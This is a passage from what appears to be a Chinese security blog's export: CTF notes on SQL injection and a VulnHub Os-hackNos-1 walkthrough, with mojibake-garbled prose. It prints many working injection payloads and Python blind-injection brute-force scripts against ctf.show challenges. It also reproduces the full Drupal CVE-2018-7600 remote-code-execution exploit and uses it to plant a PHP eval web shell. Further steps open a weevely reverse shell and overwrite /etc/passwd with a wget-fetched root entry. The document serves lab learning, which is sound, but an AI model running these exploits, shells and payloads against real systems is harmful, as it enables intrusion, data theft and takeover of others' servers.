<p>æŸ¥çœ‹æ•°æ®åº“è¡¨çš„æ•°é‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = &#x27;web2&#x27;),3 limit 1,2;#--</span><br></pre></td></tr></table></figure>

<p>æ•°é‡ä¸º2</p>
<p>æŸ¥ç¬¬ä¸€ä¸ªè¡¨çš„åå­—ï¼Œ**ç¬¬ä¸€ä¸ªè¡¨:**flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#x27;web2&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨åˆ—çš„æ•°é‡</strong>,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨åˆ—çš„åå­—</strong>   <em>åˆ—åä¸ºflag</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨è®°å½•çš„æ•°é‡</strong>        æ•°é‡ä¸º1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥flagè¡¨è®°å½•å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>1â€™ union select 1,password from ctfshow_user5 where username&#x3D;â€™flagâ€™ into outfile â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txtâ€™ â€“ A#ç”Ÿæˆå¹¶ä¿å­˜åœ¨ç½‘é¡µç›®å½•ä¸‹ctf.txtæ–‡ä»¶#ctfshowweb175</p>
<p>  if(!preg_match(â€˜&#x2F;[\x00-\x7f]&#x2F;iâ€™, json_encode($ret))){<br>      $ret[â€˜msgâ€™]&#x3D;â€™æŸ¥è¯¢æˆåŠŸâ€™;<br>    }<br>sql å­—ç¬¦æ³¨å…¥ç»•è¿‡ ç©ºæ ¼ %09(tab)Â %20( )æ³¨é‡Šç»•è¿‡&#x2F;**&#x2F;%0a%0b%0c<br> return preg_match(â€˜&#x2F; |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|#|file|into|select&#x2F;iâ€™, $str);<br>%23(#)Â </p>
<p>-1â€™or(id&#x3D;26)andâ€™aâ€™&#x3D;â€™aÂ  Â  Â  Â  Â  Â #æ‹¬å·ç»•è¿‡ç©ºæ ¼ ctfshow180<br>-1â€™ or username &#x3D; â€˜flagâ€™ â€“+</p>
<h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>æ”»é˜²ä¸–ç•Œsupersqli</p>
<h3 id="æŸ¥çœ‹å­—æ®µ"><a href="#æŸ¥çœ‹å­—æ®µ" class="headerlink" title="æŸ¥çœ‹å­—æ®µ"></a>æŸ¥çœ‹å­—æ®µ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by  2 #</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ•°æ®åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;--+</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;;use supersqli;show tables;#</span><br></pre></td></tr></table></figure>

<p>æŸ¥å­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` ;--+</span><br></pre></td></tr></table></figure>

<p>å‘ç°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words` ;--+</span><br></pre></td></tr></table></figure>



<p>handleræŸ¥è¯¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1â€™;handler 1919810931114514 open;handler 1919810931114514 read first;#</span><br></pre></td></tr></table></figure>

<p> 1ã€æ‰“å¼€å¥æŸ„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table open;</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥çœ‹æ•°æ®"><a href="#æŸ¥çœ‹æ•°æ®" class="headerlink" title="æŸ¥çœ‹æ•°æ®"></a>æŸ¥çœ‹æ•°æ®</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table read first; //è·å–ç¬¬ä¸€è¡Œ</span><br><span class="line">handler handler_table read next; //è·å–ä¸‹ä¸€è¡Œ</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…é€šè¿‡æ”¹è¡¨å</p>
<p>æ ¹æ®åœ¨wordsè¡¨é‡Œå‘ç°idå­—æ®µä¸æŸ¥è¯¢æ¡†é‡Œçš„å‡ºçš„æ•°æ®ç±»å‹ç›¸åŒï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹é»˜è®¤æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨ï¼Œinjectï¼ˆæœç´¢æ¡†ä¸­ï¼‰å€¼åº”è¯¥èµ‹ç»™äº†id<br>åˆ©ç”¨ï¼šæˆ‘ä»¬å¯ä»¥å°†å«æœ‰flagå­—æ®µçš„è¡¨å‘½åä¸ºwordï¼Œç„¶åä¿®æ”¹å­—æ®µåå­—ï¼Œä¸å°±æŸ¥è¯¢åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼ï¼ˆå‰ææ˜¯è¿™é‡Œrenameï¼Œalertå…³é”®å­— æ²¡æœ‰åšè¿‡æ»¤ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 ; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br><span class="line"> æ‹†å¼€ï¼š</span><br><span class="line">1;  alter tables words rename to words1; </span><br><span class="line">1;  alter tables `1919810931114514` rename to words ;</span><br><span class="line">1;  alter tables words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>ä¸‡èƒ½å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">(5æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•Œä¹‹supersqli_æ”»é˜²ä¸–ç•Œsupersqli_é‡‘ å¸›çš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>åˆ©ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨<code>extractvalue</code>å’Œ<code>updatexml</code>ä¸¤ä¸ªå‡½æ•°</p>
<p>extractvalueå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)</span><br><span class="line">æ­£å¸¸è¯­æ³•ï¼šextractvalue(xml_document,Xpath_string);</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²</span><br><span class="line">ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>

<p> â‘  0x7e&#x3D;â€™<del>â€™<br> â‘¡ concat(â€˜aâ€™,â€˜bâ€™)&#x3D;â€œabâ€<br> â‘¢ version()&#x3D;@@version<br> â‘£ â€˜</del>â€˜å¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦<br> â‘¤ extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½</p>
<p>updatexmlå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡½æ•°åŸå‹ï¼šupdatexml(xml_document,xpath_string,new_value)</span><br><span class="line">æ­£å¸¸è¯­æ³•ï¼šupdatexml(xml_document,xpath_string,new_value)</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²</span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueæ˜¯stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„è´Ÿè·æ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/silence1_/article/details/90812612">(8æ¡æ¶ˆæ¯) sqlæ³¨å…¥ä¹‹æŠ¥é”™æ³¨å…¥_Dar1in9çš„åšå®¢-CSDNåšå®¢</a></p>
<h3 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-error"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-error" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]error"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]error</h3><p>nssctfçš„é¢˜</p>
<p>ç”¨xpathè¯­æ³•é”™è¯¯æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ©ç”¨<code>extractvalue</code>å’Œ<code>updatexml</code>ä¸¤ä¸ªå‡½æ•°</p>
<p>çˆ†å‡ºæ•°æ®åº“ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºæ‰€æœ‰æ•°æ®åº“å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(schema_name) from information_schema.schemata))))#</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºæ•°æ®åº“test_dbä¸‹æ‰€æœ‰çš„è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºtest_dbæ•°æ®åº“ä¸‹test_tbè¡¨æ‰€æœ‰çš„åˆ—å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 1 , 31)))))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 31 , 60)))))#</span><br></pre></td></tr></table></figure>

<h2 id="æ­£åˆ™ç›²æ³¨"><a href="#æ­£åˆ™ç›²æ³¨" class="headerlink" title="æ­£åˆ™ç›²æ³¨"></a>æ­£åˆ™ç›²æ³¨</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">strs = string.printable</span><br><span class="line">url = &quot;http://x.x.x.x:8001/Less-8/index.php?id=&quot;</span><br><span class="line"></span><br><span class="line">database1 = &quot;&#x27; or database() regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line">table1 = &quot;&#x27; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line">cloumn1 = &quot;&#x27; or (select column_name from information_schema.columns where table_name=\&quot;users\&quot; and table_schema=database() limit 1,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line">data1 = &quot;&#x27; or (select username from users limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">payload = database1</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1,40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name+j)</span><br><span class="line">            urls = url+payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j,end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char ==&#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>



<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>äºŒåˆ†æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://d27e3b82-15f0-4e91-963c-859afc7ecaab.challenge.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # æŸ¥æ•°æ®åº“</span><br><span class="line">         # payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">        #æŸ¥æ•°æ®åº“</span><br><span class="line">       #  payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;&quot;</span><br><span class="line">        # æŸ¥å­—æ®µ</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br><span class="line">        # æŸ¥flag</span><br><span class="line">       # payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#x27;1&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &quot;å¯†ç é”™è¯¯&quot;  == r.json()[&#x27;msg&#x27;]:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>åˆ©ç”¨sleep()æˆ–benchmark()ç­‰å‡½æ•°è®©mysqlæ‰§è¡Œæ—¶é—´å˜é•¿ç»å¸¸ä¸if(expr1,expr2,expr3)è¯­å¥ç»“åˆä½¿ç”¨ï¼Œé€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®ã€‚if(expr1,expr2,expr3)å«ä¹‰æ˜¯å¦‚æœexpr1æ˜¯True,åˆ™è¿”å›expr2,å¦åˆ™è¿”å›expr3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://e207c481-18cb-44fa-936b-eb02a0e88231.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url + payload, timeout=0.5)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
  </entry>
  <entry>
    <title>vulnhubç»ƒä¹ 1</title>
    <url>/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="Os-hackNos-1"><a href="#Os-hackNos-1" class="headerlink" title="Os-hackNos-1"></a>Os-hackNos-1</h2><p>ä¿¡æ¯æœé›†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.1-254 -sP</span><br></pre></td></tr></table></figure>

<p>ç›®æ ‡é¶æœº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.158.155</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.155 -Pn</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ç«¯å£å¼€æ”¾ï¼Œ22ï¼Œ80</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.158.155/</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.158.155/drupal/</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.158.155/drupal/CHANGELOG.txt</span><br></pre></td></tr></table></figure>



<p>exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def get_args():</span><br><span class="line">  parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7600.py&quot;,</span><br><span class="line">                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),</span><br><span class="line">                    epilog= &#x27;&#x27;&#x27;</span><br><span class="line">                    This script will exploit the (CVE-2018-7600) vulnerability in Drupal 7 &lt;= 7.57</span><br><span class="line">                    by poisoning the recover password form (user/password) and triggering it with</span><br><span class="line">                    the upload file via ajax (/file/ajax).</span><br><span class="line">                    &#x27;&#x27;&#x27;)</span><br><span class="line">  parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)</span><br><span class="line">  parser.add_argument(&quot;-p&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)</span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  return args</span><br><span class="line"></span><br><span class="line">def pwn_target(target, function, command, proxy):</span><br><span class="line">  requests.packages.urllib3.disable_warnings()</span><br><span class="line">  proxies = &#123;&#x27;http&#x27;: proxy, &#x27;https&#x27;: proxy&#125;</span><br><span class="line">  print(&#x27;[*] Poisoning a form and including it in cache.&#x27;)</span><br><span class="line">  get_params = &#123;&#x27;q&#x27;:&#x27;user/password&#x27;, &#x27;name[#post_render][]&#x27;:function, &#x27;name[#type]&#x27;:&#x27;markup&#x27;, &#x27;name[#markup]&#x27;: command&#125;</span><br><span class="line">  post_params = &#123;&#x27;form_id&#x27;:&#x27;user_pass&#x27;, &#x27;_triggering_element_name&#x27;:&#x27;name&#x27;, &#x27;_triggering_element_value&#x27;:&#x27;&#x27;, &#x27;opz&#x27;:&#x27;E-mail new Password&#x27;&#125;</span><br><span class="line">  r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">  soup = BeautifulSoup(r.text, &quot;html.parser&quot;)</span><br><span class="line">  try:</span><br><span class="line">    form = soup.find(&#x27;form&#x27;, &#123;&#x27;id&#x27;: &#x27;user-pass&#x27;&#125;)</span><br><span class="line">    form_build_id = form.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;: &#x27;form_build_id&#x27;&#125;).get(&#x27;value&#x27;)</span><br><span class="line">    if form_build_id:</span><br><span class="line">        print(&#x27;[*] Poisoned form ID: &#x27; + form_build_id)</span><br><span class="line">        print(&#x27;[*] Triggering exploit to execute: &#x27; + command)</span><br><span class="line">        get_params = &#123;&#x27;q&#x27;:&#x27;file/ajax/name/#value/&#x27; + form_build_id&#125;</span><br><span class="line">        post_params = &#123;&#x27;form_build_id&#x27;:form_build_id&#125;</span><br><span class="line">        r = requests.post(target, params=get_params, data=post_params, verify=False, proxies=proxies)</span><br><span class="line">        parsed_result = r.text.split(&#x27;[&#123;&quot;command&quot;:&quot;settings&quot;&#x27;)[0]</span><br><span class="line">        print(parsed_result)</span><br><span class="line">  except:</span><br><span class="line">    print(&quot;ERROR: Something went wrong.&quot;)</span><br><span class="line">    raise</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">  print ()</span><br><span class="line">  print (&#x27;=============================================================================&#x27;)</span><br><span class="line">  print (&#x27;|          DRUPAL 7 &lt;= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |&#x27;)</span><br><span class="line">  print (&#x27;|                              by pimps                                     |&#x27;)</span><br><span class="line">  print (&#x27;=============================================================================\n&#x27;)</span><br><span class="line"></span><br><span class="line">  args = get_args() # get the cl args</span><br><span class="line">  pwn_target(args.target.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ–¹æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dru*.py  http://192.168.158.155/drupal/ -c &quot;ls&quot;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dru*.py  http://192.168.158.155/drupal/ -c &quot;echo &#x27;&lt;?=eval(\$_POST[1])?&gt;&#x27; &gt; 1.php&quot;</span><br></pre></td></tr></table></figure>

<p>weevely:ç”Ÿæˆä»¥åŠè¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely generate &lt;è¿æ¥å¯†ç &gt; &lt;path&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weevely &lt;url&gt; &lt;è¿æ¥å¯†ç &gt;</span><br></pre></td></tr></table></figure>

<p>å±•ç¤ºçœŸå®ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:audit_etcpasswd -real</span><br></pre></td></tr></table></figure>

<p>åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.158.129 3366</span><br></pre></td></tr></table></figure>

<h3 id="SUID-ææƒ"><a href="#SUID-ææƒ" class="headerlink" title="SUID ææƒ"></a>SUID ææƒ</h3><p>SUIDæ˜¯Linuxçš„ä¸€ç§æƒé™æœºåˆ¶ï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚å¦‚æœæ‹¥æœ‰SUIDæƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ç³»ç»Ÿä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œå·¥å…·æ¥è¿›è¡Œrootææƒã€‚</p>
<p>å‘½ä»¤å°†å°è¯•æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517202237.png"></p>
<p>ç„¶åæŠŠetc&#x2F;passwdä¸­çš„rooté‚£è¡Œå¤åˆ¶ä¸€ä¸‹ï¼Œxæ¢æˆæˆ‘ä»¬ç”Ÿæˆçš„å¯†ç å“ˆå¸Œï¼Œé‡æ–°æ·»åŠ åˆ°æ–°çš„ä¸€è¡Œå½“ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨suå‘½ä»¤æŠ¥é”™ï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨python ç»ˆç«¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€è¡Œå¤åˆ¶ï¼Œåœ¨æœ€ä½åŠ ä¸€è¡Œï¼Œå°†x æ¢ä¸ºå“ˆå¸Œå€¼</p>
<p>ä¿®æ”¹ä¸ºå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt zhou zhou</span><br><span class="line">$1$zhou$IY3SDlxhR.gde5eP6C/Y/0</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517200256.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.158.129:12345/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>

<p>-Oå‚æ•°æ˜¯æ›¿æ¢&#x2F;etc&#x2F;passwd</p>
<p>ä½¿ç”¨suå‘½ä»¤æŠ¥é”™ï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨python ç»ˆç«¯</p>
